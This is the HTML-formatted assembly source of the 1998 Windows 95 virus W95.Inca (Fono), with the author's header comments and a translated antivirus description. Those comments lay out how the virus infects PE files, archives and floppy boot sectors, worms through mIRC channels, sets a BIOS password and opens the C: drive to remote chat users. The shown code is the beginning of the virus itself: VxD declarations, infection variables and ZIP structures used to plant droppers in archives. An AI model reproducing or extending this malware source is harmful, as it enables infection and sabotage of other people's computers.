<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Virus.Win9x.Fono.15327 - inca.asm.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
.sc13 {
	color: #808080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;[W95.INCA] Multipartite PE/BOOT polymorphic mIRC spreading infector</span><span class="sc0">
</span><span class="sc1">;Copyright 1998 (c) Vecna</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;This is my first attempt at w95 plataform. Is a multipartite infector of PE</span><span class="sc0">
</span><span class="sc1">;filez, focused in fast spreading. It infect PE files by adding a new section</span><span class="sc0">
</span><span class="sc1">;randomly named and a polymorphic VxD-dropper. It infect ARJ/ZIP/RAR/LHA/PAK</span><span class="sc0">
</span><span class="sc1">;by adding a random named COM dropper, encripted by a polymorphic loop. It</span><span class="sc0">
</span><span class="sc1">;infect boot of floppies by adding a polymorphic loader to their boot sectorz.</span><span class="sc0">
</span><span class="sc1">;It spread over internet using DCC protocol provided by mIRC, using a worm to</span><span class="sc0">
</span><span class="sc1">;spread over channelz. In the internet part is also the payload activation.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;The polymorphic decriptor in PE files isnt based in math instructionz, but</span><span class="sc0">
</span><span class="sc1">;in swapping. This novel technic of encription should provide problemz to</span><span class="sc0">
</span><span class="sc1">;disinfection and detection i hope, as not the whole code is "encripted" , but</span><span class="sc0">
</span><span class="sc1">;just some chunkz. The polymorphic decriptor is filled by lotz of conditionalz</span><span class="sc0">
</span><span class="sc1">;and unconditional jumpz.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;The polymorphic engine that generate the droppers and the boot loader keep</span><span class="sc0">
</span><span class="sc1">;track of the contentz of all regz and flagz, as in advanced engines as</span><span class="sc0">
</span><span class="sc1">;Uruguay or Level3. This mean that if i need AX holding 0x0202, as for load 2</span><span class="sc0">
</span><span class="sc1">;sectorz in the boot loader, i can obtain this values using XOR AX, ??? or</span><span class="sc0">
</span><span class="sc1">;ADD AX, ??? and like.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;This source isnt compilable as is. Use the pre-compiled virus.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Here's the description of w95/Inca by DrWeb, translated from russian to</span><span class="sc0">
</span><span class="sc1">;english by Lurker (thankz!!)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Win95. Inca</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       Dangerous resident polymorphic multipartite virus. Win95.Inca</span><span class="sc0">
</span><span class="sc1">;       infects EXE files in a format of PE (Portable Executable) for</span><span class="sc0">
</span><span class="sc1">;       operation systems Windows95/98 and boot sectors of floppy</span><span class="sc0">
</span><span class="sc1">;       disks. And also Win95.Inca is a virus-worm for ARJ, LHA, LZH,</span><span class="sc0">
</span><span class="sc1">;       PAK, RAR and ZIP-archives and for the mIRC32 program.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       When infected PE file is started, the virus receives management</span><span class="sc0">
</span><span class="sc1">;       and polymorphic decryptor deciphers the base code of a virus.</span><span class="sc0">
</span><span class="sc1">;       And this decoding is made by enough unusual way - in initial variant</span><span class="sc0">
</span><span class="sc1">;       the base virus code will contatin the table of indexes or displacements</span><span class="sc0">
</span><span class="sc1">;       of original bytes in the virus body. And it is necessary to understand</span><span class="sc0">
</span><span class="sc1">;       that decoding in this case will be substitution or compilation</span><span class="sc0">
</span><span class="sc1">;       original bytes on place of their one-byte indexes or displacements.</span><span class="sc0">
</span><span class="sc1">;       After given "assembly" of the code, virus determines (by</span><span class="sc0">
</span><span class="sc1">;       "already standard" for this type of viruses algorithm) the address</span><span class="sc0">
</span><span class="sc1">;       of interesting for it functions in KERNEL32.DLL and creates</span><span class="sc0">
</span><span class="sc1">;       a file C:\W95INCA.COM, in which file virus writes a polymorphic</span><span class="sc0">
</span><span class="sc1">;       DOS COM dropper.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       This polymorphic 16bit DOS-code is already generated on infection of</span><span class="sc0">
</span><span class="sc1">;       the PE EXE-file, and because of that any "additional efforts" for</span><span class="sc0">
</span><span class="sc1">;       creation of a polymorphic copies on the given stage are not undertaken.</span><span class="sc0">
</span><span class="sc1">;       Then the created file is closed.</span><span class="sc0">
</span><span class="sc1">;       This dropper file is executed by the virus and then, after some delay,</span><span class="sc0">
</span><span class="sc1">;       deleted. Further the virus returnes back management to the</span><span class="sc0">
</span><span class="sc1">;       infected host PE-file.</span><span class="sc0">
</span><span class="sc1">;       This is all actions, which carries out a virus code in the PE EXE-file.</span><span class="sc0">
</span><span class="sc1">;       Therefore, it is possible to consider all infected PE EXE-files, as</span><span class="sc0">
</span><span class="sc1">;       droppers.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       The C:\W95INCA.COM file, executed by the virus, determines Windows</span><span class="sc0">
</span><span class="sc1">;       directory (WINDIR) and tries to create in the \WINDOWS\SYSTEM folder</span><span class="sc0">
</span><span class="sc1">;       a file with the name FONO98.VXD.</span><span class="sc0">
</span><span class="sc1">;       If this attempt is successful, the virus unpacks</span><span class="sc0">
</span><span class="sc1">;       with the elementary algorithm, a code of the 32bit VxD-driver,</span><span class="sc0">
</span><span class="sc1">;       which is contained inside of the 16bit DOS-code, and writes it in</span><span class="sc0">
</span><span class="sc1">;       this newly created FONO98.VXD file.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       Further virus opens a configuration Windows file SYSTEM.INI, searches</span><span class="sc0">
</span><span class="sc1">;       in it for the section "[386Enh]" and just below this line</span><span class="sc0">
</span><span class="sc1">;       writes a line "device=fono98.vxd".</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       After described manipulations, or, if the line "device=fono98.vxd"</span><span class="sc0">
</span><span class="sc1">;       is already is present in the SYSTEM.INI, or file FONO98.VXD</span><span class="sc0">
</span><span class="sc1">;       was created earlier in the \WINDOWS\SYSTEM folder, or,</span><span class="sc0">
</span><span class="sc1">;       if it wasn't possible to find the WINDOWS folder, virus finishes its</span><span class="sc0">
</span><span class="sc1">;       work and returns management to DOS.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       After the system reboot and on the next startof Windows virus</span><span class="sc0">
</span><span class="sc1">;       VxD-driver FONO98.VXD is loaded by the system into a memory and</span><span class="sc0">
</span><span class="sc1">;       runned.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       In a first task, the virus driver deletes system VxD-driver HSFLOP.PDR</span><span class="sc0">
</span><span class="sc1">;       in the catalogue \WINDOWS\SYSTEM\IOSUBSYS folder. Then virus reads</span><span class="sc0">
</span><span class="sc1">;       in memory a code from its own FONO98.VXD and creates in memory</span><span class="sc0">
</span><span class="sc1">;       three different polymorphic copies: for infection PE EXE-files,</span><span class="sc0">
</span><span class="sc1">;       for infection of boot-sectors of floppies and for creation of</span><span class="sc0">
</span><span class="sc1">;        16bit DOS droppers in a format of COM-files.</span><span class="sc0">
</span><span class="sc1">;       Futher, in a current session, and untill the next system reboot,</span><span class="sc0">
</span><span class="sc1">;       virus will infect the specified objects only with these copies.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       Win95.Inca concerns to a class of the "slow polymorpics".</span><span class="sc0">
</span><span class="sc1">;       Further virus "intercepts" IFSMgr FileSystemApiHook and Int 13h</span><span class="sc0">
</span><span class="sc1">;       (disk operations), establishing on them its own events handlers.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       IFSMgr handler of the virus supervises opening files. On the</span><span class="sc0">
</span><span class="sc1">;       opening files with extensions EXE and SCR, virus checks their</span><span class="sc0">
</span><span class="sc1">;       internal format, and if the opening files are Portable Executable,</span><span class="sc0">
</span><span class="sc1">;       virus infects them, by creating additional code section with a</span><span class="sc0">
</span><span class="sc1">;       random name in the header of PE-file and writing in its area virus</span><span class="sc0">
</span><span class="sc1">;       polymorphic code. On opening of archive files with the extensions</span><span class="sc0">
</span><span class="sc1">;       LHA, LZH, PAK, ZIP, ARJ or RAR, the virus adds to the given</span><span class="sc0">
</span><span class="sc1">;       archives its 16bit polymorphic code (worm) in a format of COM-file,</span><span class="sc0">
</span><span class="sc1">;       also modifies header of the archive files in such a manner that</span><span class="sc0">
</span><span class="sc1">;       the this virus-worm appears placed in the archive in a unpacked</span><span class="sc0">
</span><span class="sc1">;       form (store format) also receives a random name, consisting from</span><span class="sc0">
</span><span class="sc1">;       four letters, and with the extension COM or EXE (for example, AAAA.COM</span><span class="sc0">
</span><span class="sc1">;       or ABCD.EXE). On opening of the MIRC32.EXE file (program for</span><span class="sc0">
</span><span class="sc1">;       "chat" over the Internet) the virus writes or adds in the end</span><span class="sc0">
</span><span class="sc1">;       of the configuration file MIRC.INI, line " [fileserver]" and</span><span class="sc0">
</span><span class="sc1">;       "Warning = Off".</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       Also virus creates a new (if they exist on a disk) files SCRIPT.OLD,</span><span class="sc0">
</span><span class="sc1">;       SCRIPT.INI, INCA.EXE and REVENGE.COM.</span><span class="sc0">
</span><span class="sc1">;       In the file INCA.EXE, virus writes a code of the polymorphic 16bit</span><span class="sc0">
</span><span class="sc1">;       virus-worm. In the file REVENGE.COM - 231 bytes of the trojan code,</span><span class="sc0">
</span><span class="sc1">;       that rewrites the content of the CMOS-memory.</span><span class="sc0">
</span><span class="sc1">;       [*Authors Note - It put a password in AMI/AWARD BIOS*]</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       And in the file SCRIPT.INI virus writes text of the virus MIRC-worm.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       On start of the MIRC32.INI under scenario of the SCRIPT.INI,</span><span class="sc0">
</span><span class="sc1">;       it runs the file INCA.EXE. Further under the same scenario it</span><span class="sc0">
</span><span class="sc1">;       tries to send files SCRIPT.INI (mIRC-worm) and INCA.EXE (virus</span><span class="sc0">
</span><span class="sc1">;       dropper) to computers of all members of the "chat conversation" in</span><span class="sc0">
</span><span class="sc1">;       the Internet.</span><span class="sc0">
</span><span class="sc1">;       If during the chat there will appaer a text string "El_inca",</span><span class="sc0">
</span><span class="sc1">;       under the scenario of the SCRIPT.INI - trojan program REVENGE.COM</span><span class="sc0">
</span><span class="sc1">;       will be launched. If somebody will "tell a word" "ancev",</span><span class="sc0">
</span><span class="sc1">;       the virus script "will allow" him to access disk  drive C:.</span><span class="sc0">
</span><span class="sc1">;       Even if this person is for several thousand miles from the infected</span><span class="sc0">
</span><span class="sc1">;       computer.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       And if at the time of "conversation" there will appear a text</span><span class="sc0">
</span><span class="sc1">;        "_29A_", the program MIRC32.EXE will self-exits.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       Virus handler of the disk operations on the Int 13h, supervises</span><span class="sc0">
</span><span class="sc1">;       the reading of the boot sectors of the floppes in the drive A:</span><span class="sc0">
</span><span class="sc1">;       and on an opportunity infects them, by replacing the original</span><span class="sc0">
</span><span class="sc1">;       boot loader with polymorphic, and writing on a disk its own</span><span class="sc0">
</span><span class="sc1">;       copies.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       On a booting from such infected floppy, virus loader will</span><span class="sc0">
</span><span class="sc1">;       receive management, and will read to memory all sectors with the</span><span class="sc0">
</span><span class="sc1">;       virus code, "will intercept" Int 1Ch (timer), and then Int 21h.</span><span class="sc0">
</span><span class="sc1">;       A task of the  Int21h handler is simple - on the first</span><span class="sc0">
</span><span class="sc1">;       opportunity, it tries to create FONO98.VXD in the</span><span class="sc0">
</span><span class="sc1">;       C:\WINDOWS\SYSTEM folder and to register</span><span class="sc0">
</span><span class="sc1">;       it in the SYSTEM.INI configuration file (in the "[386Enh]" section).</span><span class="sc0">
</span><span class="sc1">;       The task is exactly the same, as well as performed by a</span><span class="sc0">
</span><span class="sc1">;       C:\W95INCA.COM file-dropper, algorithm of which was</span><span class="sc0">
</span><span class="sc1">;       described in the beginning.</span><span class="sc0">
</span><span class="sc1">;       A difference only that the dropper C:\W95INCA.COM determines</span><span class="sc0">
</span><span class="sc1">;       the lochation of Windows system folder fome a variable WINDIR.</span><span class="sc0">
</span><span class="sc1">;       And Int21h handler tries to place dropper in the C:\WINDOWS\SYSTEM</span><span class="sc0">
</span><span class="sc1">;       folder.</span><span class="sc0">
</span><span class="sc1">;       After the given attempt (successful or not) the virus</span><span class="sc0">
</span><span class="sc1">;       "releases" Int21h and neutralizes its own copy in memory.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       The virus contains text "El Inca virus".</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       The size of the virus VxD-driver is 15327 bytes.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       So, all infected objects can be considered as virus-hosts or droppers,</span><span class="sc0">
</span><span class="sc1">;       except created by the virus VxD-driver.</span><span class="sc0">
</span><span class="sc1">;       This VxD-driver installs virus copy in memory, and hits all other</span><span class="sc0">
</span><span class="sc1">;       objects. However you see that it does not infect</span><span class="sc0">
</span><span class="sc1">;       "similar to itself" VxD-drivers. VxD-driver is only the carrier</span><span class="sc0">
</span><span class="sc1">;       of an infection, but it is not an infected object.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">


         </span><span class="sc5">MINSIZEINFECT</span><span class="sc0">  </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc4">*</span><span class="sc2">1024</span><span class="sc0">             </span><span class="sc1">;zopy me - i want to trawel</span><span class="sc0">


  </span><span class="sc5">BPB</span><span class="sc0"> </span><span class="sc9">STRUC</span><span class="sc0">
         </span><span class="sc5">bpb_jmp</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
         </span><span class="sc5">bpb_oem</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
         </span><span class="sc5">bpb_b_s</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
         </span><span class="sc5">bpb_s_c</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
         </span><span class="sc5">bpb_r_s</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
         </span><span class="sc5">bpb_n_f</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
         </span><span class="sc5">bpb_r_e</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
         </span><span class="sc5">bpb_t_s</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
         </span><span class="sc5">bpb_m_d</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
         </span><span class="sc5">bpb_s_f</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
         </span><span class="sc5">bpb_s_t</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
         </span><span class="sc5">bpb_n_h</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
         </span><span class="sc5">bpb_h_d</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
         </span><span class="sc5">bpb_sht</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
  </span><span class="sc5">BPB</span><span class="sc0"> </span><span class="sc9">ENDS</span><span class="sc0">

</span><span class="sc2">.386p</span><span class="sc0">
</span><span class="sc9">.XLIST</span><span class="sc0">
   </span><span class="sc9">Include</span><span class="sc0"> </span><span class="sc5">Vmm.Inc</span><span class="sc0">
   </span><span class="sc9">Include</span><span class="sc0"> </span><span class="sc5">Ifs.Inc</span><span class="sc0">
   </span><span class="sc9">Include</span><span class="sc0"> </span><span class="sc5">Ifsmgr.Inc</span><span class="sc0">
</span><span class="sc9">.LIST</span><span class="sc0">

</span><span class="sc5">Declare_Virtual_Device</span><span class="sc0"> </span><span class="sc5">FONO98</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">FONO98_Control</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Undefined_Device_ID</span><span class="sc4">,,,</span><span class="sc0">

</span><span class="sc5">VxD_Locked_Code_Seg</span><span class="sc0">

       </span><span class="sc5">IncaName</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'INCA.EXE'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">             </span><span class="sc1">;Vars used by the virus</span><span class="sc0">
       </span><span class="sc5">NextHook</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc5">FileHandle</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc5">FileSize</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc5">FileAttr</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc5">Pad</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc5">BufferOneHandle</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc5">BufferTwoHandle</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc5">VxDCompressedBuffer</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc5">VxDCompressedSize</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc5">PolyBootSize</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc5">PolyBootBuffer</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc5">PolyDOSFileBuffer</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc5">PolyDOSFileSize</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc5">PolyPESize</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc5">PolyPEBuffer</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc5">VMF_handle</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc5">VMF_size</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc5">VMF_base</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc5">OurFile</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc5">FloppyInUse</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc5">UpDown</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc5">Compressed</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc5">CrpTbl</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">200h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
     </span><span class="sc5">SectorBuffer</span><span class="sc0">     </span><span class="sc9">Equ</span><span class="sc0"> </span><span class="sc9">This</span><span class="sc0"> </span><span class="sc10">Byte</span><span class="sc0">
       </span><span class="sc5">CrcTab</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">2048</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
     </span><span class="sc5">FileName</span><span class="sc0">         </span><span class="sc9">Equ</span><span class="sc0"> </span><span class="sc9">This</span><span class="sc0"> </span><span class="sc10">Byte</span><span class="sc0">
       </span><span class="sc5">VMM32Path</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">MAX_PATH</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">



       </span><span class="sc5">ZIPRHeaderId</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'PK'</span><span class="sc0">             </span><span class="sc1">;Structures used when</span><span class="sc0">
       </span><span class="sc5">ZIPRSignature</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">01</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02</span><span class="sc0">           </span><span class="sc1">;infecting archivers</span><span class="sc0">
       </span><span class="sc5">ZIPRVerMade</span><span class="sc0">         </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0">
       </span><span class="sc5">ZIPRVerNeed</span><span class="sc0">         </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0ah</span><span class="sc0">
       </span><span class="sc5">ZIPRFlags</span><span class="sc0">           </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc5">ZIPRMethod</span><span class="sc0">          </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc5">ZIPRTimeDate</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">12345678h</span><span class="sc0">
       </span><span class="sc5">ZIPRCRC32</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc5">ZIPRCompressed</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc5">ZIPRUncompressed</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc5">ZIPRSizeFilename</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc5">ZIPRNameLenght</span><span class="sc0">
       </span><span class="sc5">ZIPRExtraField</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc5">ZIPRCommentSize</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc5">ZIPRDiskNumba</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc5">ZIPRInternalAttr</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">01</span><span class="sc0">
       </span><span class="sc5">ZIPRExternalAttr</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
       </span><span class="sc5">ZIPROffsetLHeaderR</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc5">ZIPRFilename</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'AAAA.COM'</span><span class="sc0">
     </span><span class="sc5">ZIPRNameLenght</span><span class="sc0">      </span><span class="sc9">Equ</span><span class="sc0"> </span><span class="sc9">This</span><span class="sc0"> </span><span class="sc10">Byte</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">ZIPRFilename</span><span class="sc0">
     </span><span class="sc5">ZIPRHeaderSize</span><span class="sc0">      </span><span class="sc9">Equ</span><span class="sc0"> </span><span class="sc9">This</span><span class="sc0"> </span><span class="sc10">Byte</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">ZIPRHeaderId</span><span class="sc0">

       </span><span class="sc5">ZIPLHeaderId</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'PK'</span><span class="sc0">
       </span><span class="sc5">ZIPLSignature</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0403h</span><span class="sc0">
       </span><span class="sc5">ZIPLVersionNeed</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0010</span><span class="sc0">
       </span><span class="sc5">ZIPLFlags</span><span class="sc0">           </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">
       </span><span class="sc5">ZIPLMethod</span><span class="sc0">          </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc5">ZIPLDateTime</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">12345678h</span><span class="sc0">
       </span><span class="sc5">ZIPLCRC32</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc5">ZIPLCompressed</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc5">ZIPLUncompressed</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc5">ZIPLSizeFilename</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc5">ZIPLNameLenght</span><span class="sc0">
       </span><span class="sc5">ZIPLExtraField</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc5">ZIPLFilename</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'AAAA.COM'</span><span class="sc0">
     </span><span class="sc5">ZIPLNameLenght</span><span class="sc0">      </span><span class="sc9">Equ</span><span class="sc0"> </span><span class="sc9">This</span><span class="sc0"> </span><span class="sc10">Byte</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">ZIPLFilename</span><span class="sc0">

     </span><span class="sc5">ZIPReadBuffer</span><span class="sc0">       </span><span class="sc9">Equ</span><span class="sc0"> </span><span class="sc9">This</span><span class="sc0"> </span><span class="sc10">Byte</span><span class="sc0">
       </span><span class="sc5">ZIPEHeaderId</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'PK'</span><span class="sc0">
       </span><span class="sc5">ZIPSignature</span><span class="sc0">        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
